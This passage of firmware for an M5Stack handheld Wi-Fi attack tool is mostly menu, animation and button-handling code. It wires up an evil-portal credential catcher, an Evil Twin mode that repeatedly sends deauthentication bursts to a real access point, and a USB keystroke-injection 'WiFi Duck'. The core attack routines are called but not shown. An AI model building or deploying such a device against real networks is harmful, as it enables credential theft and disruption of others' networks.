  M5.Lcd.setTextColor(portalStarted ? C_OK : C_DANGER);
  M5.Lcd.drawString(portalStarted ? "PORTAL ON" : "PORTAL OFF", 20, 35);
  M5.Lcd.setTextDatum(MR_DATUM);
  M5.Lcd.setTextColor(C_MUTED);
  M5.Lcd.drawString("Caps " + String(storedCount) + "   Cli " + String(clients), 232, 35);
}

// Brief centered toast with a quick "pop" (grow) animation.
void toastMsg(const char* msg) {
  const int w = 190, h = 42, cx = 120, cy = 135 / 2;
  for (int s = 1; s <= 3; s++) {              // grow from center
    int ww = w * s / 3, hh = h * s / 3, x = cx - ww / 2, y = cy - hh / 2;
    M5.Lcd.fillRoundRect(x, y, ww, hh, 8, C_ACCENT);
    M5.Lcd.drawRoundRect(x, y, ww, hh, 8, C_ACC_HI);
    delay(26);
  }
  int x = cx - w / 2, y = cy - h / 2;
  M5.Lcd.fillRoundRect(x, y, w, h, 8, C_ACCENT);
  M5.Lcd.drawRoundRect(x, y, w, h, 8, C_ACC_HI);
  M5.Lcd.setTextDatum(MC_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, C_ACCENT);
  M5.Lcd.drawString(msg, cx, cy);
  delay(850);
}

int currentMenuCount() {
  if (appState == ST_MENU_MAIN)   return 4;  // Evil Portal / WiFi Duck / Config / Exit
  if (appState == ST_MENU_PORTAL) return 5;  // Start / Evil Twin / Info / Reset / Back
  if (appState == ST_MENU_DUCK)   return 3;  // Start Duck / Info / Back
  return 5;                                  // Beep / LED / Brightness / Flip / Back
}

// Row geometry for the current menu state.
void menuGeom(int &y0, int &rowH, int &rowInner) {
  if (appState == ST_MENU_MAIN) { y0 = 32; rowH = 24; rowInner = 20; }
  else                          { y0 = 28; rowH = 20; rowInner = 17; }
}

// Label + icon for row i of the current menu.
void menuItem(int i, String &label, int &icon) {
  if (appState == ST_MENU_MAIN) {
    const char* L[] = {"Evil Portal", "WiFi Duck", "Configuration", "Exit"};
    const int   I[] = {IC_TOOLS, IC_DUCK, IC_CONFIG, IC_POWER};
    label = L[i]; icon = I[i];
  } else if (appState == ST_MENU_PORTAL) {
    const char* L[] = {"Start Portal", "Evil Twin", "Device Info", "Reset Captures", "Back"};
    const int   I[] = {IC_PLAY, IC_TWIN, IC_INFO, IC_TRASH, IC_BACK};
    label = L[i]; icon = I[i];
  } else if (appState == ST_MENU_DUCK) {
    const char* L[] = {"Start Duck", "Device Info", "Back"};
    const int   I[] = {IC_PLAY, IC_INFO, IC_BACK};
    label = L[i]; icon = I[i];
  } else {
    switch (i) {
      case 0:  label = String("Beep: ")       + (soundOn ? "ON" : "OFF");    icon = IC_TOGGLE; break;
      case 1:  label = String("LED blink: ")  + (ledBlinkOn ? "ON" : "OFF"); icon = IC_TOGGLE; break;
      case 2:  label = String("Brightness: ") + String(brightLevel + 1);     icon = IC_BRIGHT; break;
      case 3:  label = "Flip Screen";  icon = IC_FLIP; break;
      default: label = "Back";         icon = IC_BACK; break;
    }
  }
}

// Draw one menu row as a raised card: drop shadow + top bevel + (when selected)
// an accent fill, glow border, left stripe and caret. `xoff` slides the row
// horizontally for the entrance animation.
void drawMenuRow(int i, bool sel, int xoff) {
  int y0, rowH, rowInner; menuGeom(y0, rowH, rowInner);
  int y  = y0 + i * rowH;
  int x  = 8 + xoff;
  int yc = y + rowInner / 2;
  String label; int icon; menuItem(i, label, icon);

  uint16_t body = sel ? C_ACCENT : C_CARD;
  uint16_t fg   = sel ? TFT_WHITE : C_MUTED;

  M5.Lcd.fillRoundRect(x, y + 2, 224, rowInner, 5, C_CARD_SH);                     // drop shadow
  M5.Lcd.fillRoundRect(x, y,     224, rowInner, 5, body);                          // card body
  M5.Lcd.drawFastHLine(x + 6, y + 1,            212, sel ? C_ACC_HI : C_CARD_HI);  // top bevel highlight
  M5.Lcd.drawFastHLine(x + 6, y + rowInner - 1, 212, sel ? C_ACC_DK : C_CARD_SH);  // bottom edge
  if (sel) {
    M5.Lcd.drawRoundRect(x, y, 224, rowInner, 5, C_ACC_HI);                         // glow border
    M5.Lcd.fillRect(x, y + 3, 3, rowInner - 6, C_ACC_HI);                           // left accent stripe
    M5.Lcd.fillTriangle(x + 213, yc - 4, x + 213, yc + 4, x + 219, yc, TFT_WHITE);  // caret
  }
  drawMenuIcon(icon, x + 17, yc + 1, C_CARD_SH, body);   // icon shadow (depth)
  drawMenuIcon(icon, x + 16, yc,     fg,        body);   // icon
  M5.Lcd.setTextDatum(ML_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(fg, body);
  M5.Lcd.drawString(label, x + 32, yc);
}

// Footer: controls hint + position indicator.
void drawMenuFooter(int n) {
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED);
  M5.Lcd.setTextDatum(BL_DATUM);
  // On submenus, advertise the hold-to-go-back shortcut.
  M5.Lcd.drawString(appState == ST_MENU_MAIN ? "B:move  A:select"
                                             : "B:move  holdB:back  A:ok", 6, 134);
  M5.Lcd.setTextDatum(BR_DATUM);
  M5.Lcd.drawString(String(menuSel + 1) + "/" + String(n), 234, 134);
}

// Update only the "x/n" position indicator (used after a selection move).
void updateMenuCounter(int n) {
  M5.Lcd.fillRect(208, 126, 28, 9, C_BG2);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED);
  M5.Lcd.setTextDatum(BR_DATUM);
  M5.Lcd.drawString(String(menuSel + 1) + "/" + String(n), 234, 134);
}

// Entrance animation: the rows slide in from the right, staggered, with an
// ease-out so they settle smoothly into place.
void animateMenuIn(int n) {
  int y0, rowH, rowInner; menuGeom(y0, rowH, rowInner);
  int bandY = y0, bandH = n * rowH + 4;
  const int STEPS = 8;
  for (int f = 1; f <= STEPS; f++) {
    fillBgBand(bandY, bandH);
    for (int i = 0; i < n; i++) {
      float denom = (float)STEPS - i * 0.7f;
      float p = (denom > 0.5f) ? (f - i * 0.7f) / denom : 1.0f;
      if (p <= 0) continue;
      if (p > 1) p = 1;
      float e = 1 - (1 - p) * (1 - p) * (1 - p);   // easeOutCubic
      int xoff = (int)((1 - e) * 230);
      drawMenuRow(i, i == menuSel, xoff);
    }
    delay(16);
  }
  fillBgBand(bandY, bandH);
  for (int i = 0; i < n; i++) drawMenuRow(i, i == menuSel, 0);
}

// Repaint the whole menu screen for the current state + selection. When
// `animate` is set the rows slide in (used on menu transitions).
void drawMenu(bool animate) {
  int n = currentMenuCount();

  fillBgBand(0, 135);                                    // background gradient
  fillVGrad(0, 0, 240, 26, C_HDR_TOP, C_HDR_BOT);        // header gradient
  M5.Lcd.drawFastHLine(0, 26, 240, C_CARD_SH);           // header drop shadow
  M5.Lcd.setTextDatum(ML_DATUM);
  M5.Lcd.setTextSize(2);
  drawHeaderSkull(14, 12);
  M5.Lcd.setTextColor(TFT_WHITE);
  const char* title = (appState == ST_MENU_MAIN)   ? "MAIN MENU"
                     : (appState == ST_MENU_PORTAL) ? "EVIL PORTAL"
                     : (appState == ST_MENU_DUCK)   ? "WIFI DUCK" : "CONFIG";
  M5.Lcd.drawString(title, 28, 13);
  drawBatteryAt(206, 6, TFT_WHITE, C_HDR_TOP);

  if (animate) animateMenuIn(n);
  else for (int i = 0; i < n; i++) drawMenuRow(i, i == menuSel, 0);

  drawMenuFooter(n);
  if (animate) animateBloodFrame();   // blood runs down the margins as the menu opens
  else drawBloodFrame();
}

// Move the highlight to a new row: repaint just the two affected rows (snappy)
// with a quick white "pop" flash on the newly selected one.
void moveSelection(int oldSel) {
  int n = currentMenuCount();
  int y0, rowH, rowInner; menuGeom(y0, rowH, rowInner);
  drawMenuRow(oldSel, false, 0);
  drawMenuRow(menuSel, true, 0);
  int y = y0 + menuSel * rowH;
  M5.Lcd.drawRoundRect(8, y, 224, rowInner, 5, TFT_WHITE);   // flash
  delay(45);
  drawMenuRow(menuSel, true, 0);                             // settle (covers flash)
  updateMenuCounter(n);
}

// Subtle breathing glow on the highlighted row, toggled on the idle menu tick.
void pulseSelection() {
  int y0, rowH, rowInner; menuGeom(y0, rowH, rowInner);
  int y = y0 + menuSel * rowH;
  static bool on = false; on = !on;
  M5.Lcd.drawRoundRect(8, y, 224, rowInner, 5, on ? C_BLOOD_HI : C_ACC_HI);
}

// Blocking info screen; returns to the Tools menu on any button press.
void showDeviceInfo() {
  M5.Lcd.fillScreen(C_BG);
  M5.Lcd.fillRect(0, 0, 240, 26, C_ACCENT);
  M5.Lcd.setTextDatum(ML_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, C_ACCENT);
  M5.Lcd.drawString("DEVICE INFO", 8, 13);

  M5.Lcd.setTextSize(1);
  int clients = portalStarted ? WiFi.softAPgetStationNum() : 0;
  int y = 32;
  M5.Lcd.setTextColor(C_MUTED, C_BG);  M5.Lcd.drawString("SSID", 8, y);
  M5.Lcd.setTextColor(TFT_WHITE, C_BG); M5.Lcd.drawString(cfgSsid, 8, y + 10); y += 24;
  M5.Lcd.setTextColor(C_MUTED, C_BG);  M5.Lcd.drawString("ADMIN PANEL", 8, y);
  M5.Lcd.setTextColor(C_ACCENT2, C_BG); M5.Lcd.drawString("http://" + APIP.toString() + "/admin", 8, y + 10); y += 24;
  M5.Lcd.setTextColor(C_MUTED, C_BG);  M5.Lcd.drawString("PORTAL", 8, y);
  M5.Lcd.setTextColor(portalStarted ? C_OK : C_DANGER, C_BG);
  M5.Lcd.drawString(portalStarted ? "RUNNING" : "STOPPED", 8, y + 10); y += 24;
  M5.Lcd.setTextColor(C_MUTED, C_BG);  M5.Lcd.drawString("CAPTURES / CLIENTS", 8, y);
  M5.Lcd.setTextColor(C_COUNT, C_BG);
  M5.Lcd.drawString(String(storedCount) + " captured   -   " + String(clients) + " online", 8, y + 10);

  M5.Lcd.setTextDatum(BC_DATUM);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("Press any button to go back", 120, 134);

  drawBloodFrame();

  while (true) {
    M5.update();
    if (M5.BtnA.wasPressed() || M5.BtnB.wasPressed()) break;
    delay(20);
  }
  appState = infoReturn;      // back to whichever submenu opened this screen
  menuSel = infoReturnSel;
  drawMenu(true);
}

// Blocking confirm screen for Exit. BtnA powers the device off; BtnB cancels.
void doExit() {
  M5.Lcd.fillScreen(C_BG);
  M5.Lcd.setTextDatum(MC_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, C_BG);
  M5.Lcd.drawString("Power off?", 120, 50);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("BtnA = Yes       BtnB = No", 120, 90);

  while (true) {
    M5.update();
    if (M5.BtnA.wasPressed()) {
      M5.Lcd.fillScreen(C_BG);
      M5.Lcd.setTextDatum(MC_DATUM);
      M5.Lcd.setTextSize(3);
      M5.Lcd.setTextColor(C_ACCENT2, C_BG);
      M5.Lcd.drawString("Bye!", 120, 60);
      delay(700);
      M5.Power.powerOff();
    }
    if (M5.BtnB.wasPressed()) {
      appState = ST_MENU_MAIN;
      menuSel = 3;             // "Exit" is row 3 in the main menu
      drawMenu(true);
      return;
    }
    delay(20);
  }
}

// Clear all captured credentials from the device (RAM only), with feedback.
void resetCaptures() {
  clearCaptures(true);  // also resets the lifetime counter
  previous = -1;        // force the dashboard to repaint if the portal is running
  toastMsg("Captures cleared");
  appState = ST_MENU_PORTAL;
  menuSel = 3;            // "Reset Captures" row index in the Evil Portal menu
  drawMenu(true);
}

// Rotate the screen 180 degrees (handy for either hand); stays on Config.
void flipScreen() {
  screenRot = (screenRot == 3) ? 1 : 3;
  M5.Lcd.setRotation(screenRot);
  saveSettings();
  appState = ST_MENU_CONFIG;
  menuSel = 3;
  drawMenu(true);
}

// Act on the highlighted item in the current menu.
void selectCurrent() {
  if (appState == ST_MENU_MAIN) {
    if (menuSel == 0)      { appState = ST_MENU_PORTAL; menuSel = 0; drawMenu(true); }
    else if (menuSel == 1) { appState = ST_MENU_DUCK;   menuSel = 0; drawMenu(true); }
    else if (menuSel == 2) { appState = ST_MENU_CONFIG; menuSel = 0; drawMenu(true); }
    else                   { doExit(); }
  } else if (appState == ST_MENU_PORTAL) {
    if (menuSel == 0)      { startPortal(); }           // -> ST_RUNNING (plain open AP)
    else if (menuSel == 1) { enterScan(); }             // Evil Twin -> scan + pick target
    else if (menuSel == 2) { infoReturn = ST_MENU_PORTAL; infoReturnSel = 2; showDeviceInfo(); }
    else if (menuSel == 3) { resetCaptures(); }
    else                   { appState = ST_MENU_MAIN; menuSel = 0; drawMenu(true); }
  } else if (appState == ST_MENU_DUCK) {
    if (menuSel == 0)      { startDuck(); }             // -> ST_DUCK_RUNNING
    else if (menuSel == 1) { infoReturn = ST_MENU_DUCK; infoReturnSel = 1; showDeviceInfo(); }
    else                   { appState = ST_MENU_MAIN; menuSel = 1; drawMenu(true); }
  } else {  // ST_MENU_CONFIG -- toggles repaint just their own row (snappy, no slide)
    if (menuSel == 0)      { soundOn = !soundOn; saveSettings(); drawMenuRow(menuSel, true, 0); }
    else if (menuSel == 1) { ledBlinkOn = !ledBlinkOn; saveSettings(); drawMenuRow(menuSel, true, 0); }
    else if (menuSel == 2) { brightLevel = (brightLevel + 1) % 3; applyBrightness(); saveSettings(); drawMenuRow(menuSel, true, 0); }
    else if (menuSel == 3) { flipScreen(); }
    else                   { appState = ST_MENU_MAIN; menuSel = 2; drawMenu(true); }
  }
}

// Tap BtnB to scroll the selection; hold BtnB to go back up one level (no need
// to scroll to "Back"); BtnA activates. A hold triggers the back action once and
// then swallows the release, so it never also advances the selection.
void handleMenuButtons() {
  if (appState == ST_MENU_SCAN) { handleScanButtons(); return; }  // Evil Twin target picker

  static bool backArmed = false;
  if (M5.BtnB.pressedFor(600)) {                 // hold = back to the parent menu
    if (!backArmed) {
      backArmed = true;
      if      (appState == ST_MENU_PORTAL) { appState = ST_MENU_MAIN; menuSel = 0; drawMenu(true); }
      else if (appState == ST_MENU_DUCK)   { appState = ST_MENU_MAIN; menuSel = 1; drawMenu(true); }
      else if (appState == ST_MENU_CONFIG) { appState = ST_MENU_MAIN; menuSel = 3; drawMenu(true); }
    }
    return;                                      // main menu has no parent
  }
  if (M5.BtnB.wasReleased()) {                   // tap = scroll the selection
    if (backArmed) { backArmed = false; return; }   // this release ends a hold-back
    int oldSel = menuSel;
    menuSel = (menuSel + 1) % currentMenuCount();
    moveSelection(oldSel);
  }
  if (M5.BtnA.wasPressed()) {
    selectCurrent();
  }
}

void setup() {
  auto cfg = M5.config();
  M5.begin(cfg);      // M5Unified: auto-detects the StickS3, brings up Display/Power/Speaker
  M5.Speaker.begin();            // enable the speaker amp (via the M5PM1 PMU)

#if DUCK_HID
  // Enumerate as a composite USB keyboard (+ CDC serial) for the WiFi Duck.
  // The host only gets "typed" at once a payload is triggered from the panel.
  DuckKbd.begin();
  USB.begin();
#endif

  loadSettings();     // restore persisted config (SSID, login, toggles, lifetime)
  if (!LittleFS.begin(true)) {   // true = format on first boot / mount failure
    // FS unavailable: keep running RAM-only (captures just won't persist).
  }
  loadCapturesFromFlash();  // restore collected credentials saved before power-off

  // Seed a harmless example payload on first boot so the Duck panel isn't empty.
  if (!LittleFS.exists(DUCK_DEFAULT)) {
    duckWriteFile(DUCK_DEFAULT,
      "REM Example payload - opens Run and types a line (Windows)\n"
      "DELAY 600\n"
      "GUI r\n"
      "DELAY 400\n"
      "STRING notepad\n"
      "ENTER\n"
      "DELAY 900\n"
      "STRING Hello from Portal Evil HUEBR - WiFi Duck!\n");
  }
  M5.Display.setRotation(screenRot);
  ledInit();          // no-op unless LED_PIN is set to a real GPIO
  applyBrightness();
  applyVolume();      // restore the saved speaker volume
  buildLaugh();       // pre-synthesize the laugh so the boot + first capture are instant

  bootScreen();       // animated splash
  registerRoutes();   // attach HTTP handlers once (AP starts later, from the menu)

  appState = ST_MENU_MAIN;
  menuSel = 0;
  drawMenu(true);     // boot into the menu (with entrance animation)
}

void loop() {
  M5.update();  // refresh button states every tick

  if (appState == ST_RUNNING) {
    // Hold the side button (BtnB) to stop the portal and return to the menu.
    if (M5.BtnB.pressedFor(800)) {
      stopPortal();
      appState = ST_MENU_MAIN;
      menuSel = 0;
      drawMenu(true);
      return;
    }

    // BtnA (front button) opens the loot QR, then cycles its pages, then closes.
    if (M5.BtnA.wasPressed()) {
      if (!showQR) { showQR = true; qrPage = 0; drawQRScreen(qrPage); }
      else if (qrPage + 1 < QR_PAGES) { qrPage++; drawQRScreen(qrPage); }
      else { showQR = false; previous = -1; drawMainScreen(); }   // back to dashboard
    }

    // Evil Twin: keep hammering the real AP so its clients roam to our clone.
    if (twinActive && (millis() - lastDeauth) >= 80) {
      lastDeauth = millis();
      sendDeauthBurst();
    }

    if (!showQR && (millis() - lastTick) > TICK_TIMER) {   // QR screen stays put
      lastTick = millis();
      if (capcount != previous) {
        previous = capcount;
        bloodSplat();       // horror splatter flash on a fresh capture
        drawMainScreen();   // full repaint with the new count
        dotOn = true;
      } else {
        dotOn = !dotOn;     // idle heartbeat: blink the "active" dot
        drawStatusDot(dotOn);
        drawBattery();      // keep the battery reading current
      }
    }
    updateBlink();
    dnsServer.processNextRequest();   // keep serving so the scanned link loads
    webServer.handleClient();
    return;
  }

  if (appState == ST_DUCK_RUNNING) {
    // Hold BtnB to stop the Duck (abort any running script) and return to menu.
    if (M5.BtnB.pressedFor(800)) {
      stopDuck();
      appState = ST_MENU_MAIN;
      menuSel = 1;
      drawMenu(true);
      return;
    }
    // BtnB tap (short press) cycles the armed payload slot (Bash Bunny-style).
    // A long hold still stops the Duck (handled above, before release).
    if (M5.BtnB.wasPressed() && duckSlotCount > 0) {
      duckArmedSlot = (duckArmedSlot + 1) % duckSlotCount;
      drawDuckScreenStatus();
    }
    // BtnA: physical trigger -- fire the currently armed payload.
    if (M5.BtnA.wasPressed() && !duckBusy) {
      String name = (duckSlotCount > 0) ? duckSlotName[duckArmedSlot] : String("payload");
      String s = duckReadFile(duckPathFor(name));
      if (s.length()) { duckStartScript(s); drawDuckScreenStatus(); }
    }

    duckTick();                        // advance the DuckyScript (non-blocking)
    dnsServer.processNextRequest();
    webServer.handleClient();

    if ((millis() - lastTick) > TICK_TIMER) {   // refresh status + battery ~1/s
      lastTick = millis();
      drawDuckScreenStatus();
    }
    return;
  }

  // Menu states (ST_MENU_MAIN / ST_MENU_PORTAL / ST_MENU_DUCK / ST_MENU_CONFIG)
  handleMenuButtons();

  // Keep the header battery live without a full repaint. Guarded so it doesn't
  // run if a selection just left the menu.
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
    drawBatteryAt(206, 6, TFT_WHITE, C_HDR_TOP);
    pulseSelection();   // breathing glow on the highlighted row
  }
}